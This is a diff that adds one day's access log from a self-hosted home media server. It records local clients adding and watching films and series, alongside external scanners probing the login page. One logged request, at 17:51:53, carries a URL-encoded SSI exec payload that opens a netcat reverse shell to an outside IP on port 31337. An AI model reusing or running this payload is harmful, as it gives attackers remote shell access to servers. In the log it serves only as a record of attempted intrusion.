@@ -1,0 +1,142 @@
+[13:42:53] This session was started on 2022. 05. 16. 13:42:53
+[13:42:53] Listening to port 3001...
+[13:42:53] Listening to port 80...
+[14:32:18] 64.62.197.122 on login page. /
+[14:45:58] 106.75.169.79 on login page. /
+[15:05:46] 192.168.1.2 served. /admin
+[15:07:14] 192.168.1.2 served. /home
+[15:07:16] 192.168.1.2 served. /admin
+[15:10:14] charlieandthechocolatefactory.jpg downloaded.
+[15:10:15] "Charlie and the Chocolate Factory" added by 192.168.1.2.
+[15:10:34] 192.168.1.2 is watching "Charlie and the Chocolate Factory" (charlieandthechocolatefactory.mp4)
+[15:10:46] 192.168.1.2 served. /home
+[15:18:19] 194.87.71.18 on login page. /
+[15:24:39] intouchables.jpg downloaded.
+[15:24:40] "Intouchables" added by 192.168.1.2.
+[15:31:34] "Now You See Me" category added by 192.168.1.2
+[15:31:45] nowyouseeme.jpg downloaded.
+[15:31:46] "Now You See Me" added by 192.168.1.2.
+[15:32:29] nowyouseeme2.jpg downloaded.
+[15:32:29] "Now You See Me 2" added by 192.168.1.2.
+[15:32:38] 192.168.1.2 is watching "Now You See Me" (nowyouseeme.mp4)
+[15:32:55] 192.168.1.2 served. /home
+[15:33:00] 192.168.1.2 is watching "Now You See Me 2" (nowyouseeme2.mp4)
+[15:33:22] 192.168.1.2 served. /home
+[15:35:42] "Sherlock Holmes" category added by 192.168.1.2
+[15:36:52] 192.168.1.2 served. /home
+[16:04:52] sherlockholmes.jpg downloaded.
+[16:04:54] "Sherlock Holmes" added by 192.168.1.2.
+[16:09:14] sherlockholmes2.jpg downloaded.
+[16:09:15] "Sherlock Holmes: A Game of Shadows" added by 192.168.1.2.
+[16:12:00] 34.140.248.32 on login page. /
+[16:13:29] 31.220.3.140 on login page. /
+[16:17:15] 192.168.1.2 is watching "Sherlock Holmes" (sherlockholmes.mp4)
+[16:17:56] 192.168.1.2 served. /home
+[16:18:04] 192.168.1.2 is watching "Sherlock Holmes: A Game of Shadows" (sherlockholmes2.mp4)
+[16:18:47] 192.168.1.2 served. /home
+[16:19:09] 192.168.1.2 is watching "Intouchables" (intouchables.mp4)
+[16:20:27] 192.168.1.2 served. /home
+[16:22:16] 192.168.1.2 is watching "Charlie and the Chocolate Factory" (charlieandthechocolatefactory.mp4)
+[16:28:15] 154.89.5.74 on login page. /
+[16:31:13] 192.168.1.2 served. /home
+[16:31:15] 192.168.1.2 served. /admin
+[16:31:17] 192.168.1.2 served. /home
+[16:42:23] 192.168.1.2 served. /admin
+[16:42:31] 192.168.1.2 served. /home
+[17:23:09] 185.180.143.8 on login page. /
+[17:51:53] 45.148.10.81 on login page. /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%20193.124.7.9%2031337%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e
+[17:58:21] theamazingspiderman.jpg downloaded.
+[17:58:22] "The Amazing Spider-Man" added by 192.168.1.2.
+[17:58:56] theamazingspiderman2.jpg downloaded.
+[17:58:57] "The Amazing Spider-Man 2" added by 192.168.1.2.
+[17:59:00] 192.168.1.2 is watching "The Amazing Spider-Man" (theamazingspiderman.mp4)
+[17:59:07] 192.168.1.2 served. /home
+[17:59:12] 192.168.1.2 is watching "The Amazing Spider-Man 2" (theamazingspiderman2.mp4)
+[17:59:18] 192.168.1.2 served. /home
+[18:01:28] norbit.jpg downloaded.
+[18:01:29] "Norbit" added by 192.168.1.2.
+[18:01:46] 192.168.1.2 is watching "Norbit" (norbit.mp4)
+[18:07:29] 192.168.1.2 served. /404 (/media/norbit.mp4)
+[18:07:29] 192.168.1.2 served. /404 (/media/norbit.mp4)
+[18:07:29] 192.168.1.2 served. /404 (/media/norbit.mp4)
+[18:07:29] 192.168.1.2 served. /404 (/media/norbit.mp4)
+[18:07:29] 192.168.1.2 served. /404 (/media/norbit.mp4)
+[18:07:29] 192.168.1.2 served. /404 (/media/norbit.mp4)
+[18:07:33] 192.168.1.2 served. /home
+[18:07:40] 192.168.1.2 served. /movie/91
+[18:07:42] 192.168.1.2 served. /home
+[18:07:48] 192.168.1.2 served. /movie/91
+[18:07:50] 192.168.1.2 served. /home
+[18:08:07] 192.168.1.2 is watching "The Amazing Spider-Man" (theamazingspiderman.mp4)
+[18:08:27] 192.168.1.2 is watching "The Amazing Spider-Man 2" (theamazingspiderman2.mp4)
+[18:08:35] 192.168.1.2 served. /home
+[18:11:06] babydriver.jpg downloaded.
+[18:11:07] "Baby Driver" added by 192.168.1.2.
+[18:26:18] thedictator.jpg downloaded.
+[18:26:18] "The Dictator" added by 192.168.1.2.
+[18:31:07] thesimpsons.jpg downloaded.
+[18:31:08] "The Simpsons Movie" added by 192.168.1.2.
+[18:34:25] "The Informant" refreshed by 192.168.1.2. (8 episodes)
+[18:34:43] 192.168.1.15 served. /home
+[18:34:44] 192.168.1.2 is watching "The Informant" S01 E08 (informant_1_8.mkv)
+[18:34:50] 192.168.1.2 served. /home
+[18:35:00] 192.168.1.15 is watching "The Informant" S01 E07 (informant_1_7.mkv)
+[18:35:07] 192.168.1.15 is watching "The Informant" S01 E08 (informant_1_8.mkv)
+[18:35:50] 192.168.1.2 is watching "Baby Driver" (babydriver.mp4)
+[18:36:03] 192.168.1.2 served. /home
+[18:36:07] 192.168.1.2 is watching "The Dictator" (thedictator.mp4)
+[18:36:16] 192.168.1.2 served. /home
+[18:36:20] 192.168.1.2 is watching "The Simpsons Movie" (thesimpsons.mp4)
+[18:36:25] 192.168.1.2 served. /home
+[18:37:37] 192.168.1.2 served. /admin
+[19:20:44] 51.254.59.113 on login page. /
+[19:33:20] 192.168.1.2 served. /home
+[19:33:29] 192.168.1.2 served. /admin
+[19:52:57] 193.106.191.48 on login page. /?XDEBUG_SESSION_START=phpstorm
+[20:05:23] 212.129.30.8 on login page. /
+[20:06:03] 41.186.67.38 on login page. /
+[20:51:50] 172.104.138.223 on login page. /fuN3
+[22:09:01] 192.168.1.15 is watching "Peaky Blinders [CC]" S02 E02 (peakyblinders_2_2.mkv)
+[22:09:09] 192.168.1.15 is watching "Peaky Blinders [CC]" S02 E03 (peakyblinders_2_3.mkv)
+[22:13:09] 192.168.1.15 is watching "Peaky Blinders [CC]" S02 E03 (peakyblinders_2_3.mkv)
+[22:15:55] 192.168.1.2 served. /admin
+[22:29:41] 192.168.1.2 served. /admin
+[22:46:45] 94.102.61.10 on login page. /
+[22:56:54] 192.168.1.2 served. /admin
+[23:43:53] journey.jpg downloaded.
+[23:43:55] "Journey to the Center of the Earth" added by 192.168.1.2.
+[23:44:58] journey2.jpg downloaded.
+[23:44:59] "Journey 2: The Mysterious Island" added by 192.168.1.2.
+[23:46:01] despicableme.jpg downloaded.
+[23:46:02] "Despicable Me" added by 192.168.1.2.
+[23:46:32] despicableme2.jpg downloaded.
+[23:46:33] "Despicable Me 2" added by 192.168.1.2.
+[23:47:34] despicableme3.jpg downloaded.
+[23:47:35] "Despicable Me 3" added by 192.168.1.2.
+[23:48:05] 192.168.1.2 is watching "Journey to the Center of the Earth" (journey.mp4)
+[23:48:15] 192.168.1.2 served. /home
+[23:48:19] 192.168.1.2 is watching "Journey 2: The Mysterious Island" (journey2.mp4)
+[23:48:31] 192.168.1.2 served. /home
+[23:48:36] 192.168.1.2 is watching "Journey 2: The Mysterious Island" (journey2.mp4)
+[23:48:49] 192.168.1.2 served. /home
+[23:48:55] 192.168.1.2 is watching "Despicable Me" (despicableme.mp4)
+[23:49:23] 192.168.1.2 served. /home
+[23:49:27] 192.168.1.2 is watching "Despicable Me 2" (despicableme2.mp4)
+[23:52:34] 192.168.1.2 served. /home
+[23:52:39] 192.168.1.2 is watching "Despicable Me 3" (despicableme3.mp4)
+[23:54:05] 192.168.1.2 served. /home
+[23:54:13] 192.168.1.2 served. /404 (/movie/100)
+[23:54:15] 192.168.1.2 served. /home
+[23:55:35] 192.168.1.2 served. /admin
+[00:10:55] 192.168.1.2 served. /home
+[00:17:06] 192.168.1.2 is watching "Cars 2" (cars2.mp4)
+[01:14:16] 192.168.1.2 served. /home
+[01:14:18] 192.168.1.2 served. /admin
+[01:14:23] 192.168.1.2 served. /home
+[01:14:28] 192.168.1.2 is watching "Norbit" (norbit.mp4)
+[01:16:37] 192.168.1.2 served. /home
+[01:16:45] 183.136.225.42 on login page. 
+[01:16:46] 183.136.225.42 on login page. /robots.txt
+[01:23:00] 192.168.1.2 is watching "Cars 2" (cars2.mp4)
+[02:09:58] 192.168.1.2 served. /home
+[02:10:07] 192.168.1.2 served. /admin
